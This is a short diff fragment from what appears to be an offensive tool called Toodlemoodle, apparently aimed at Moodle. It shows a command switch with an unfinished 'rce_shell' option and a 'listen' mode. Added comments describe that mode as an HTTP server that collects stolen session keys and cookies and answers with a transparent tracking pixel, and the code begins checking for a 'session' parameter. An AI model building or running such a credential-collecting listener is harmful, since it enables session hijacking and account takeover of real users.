@@ -73,6 +73,8 @@ module Toodlemoodle
       when "rce_shell"
         # TODO: Riccardo
       when "listen"
+        # Starts a tiny HTTP server that listens for session keys and cookies.
+        # Always returns a transparent 1x1 image.
         server = HTTP::Server.new do |context|
           context.response.content_type = "image/png;base64"
           if context.request.query_params["session"]?
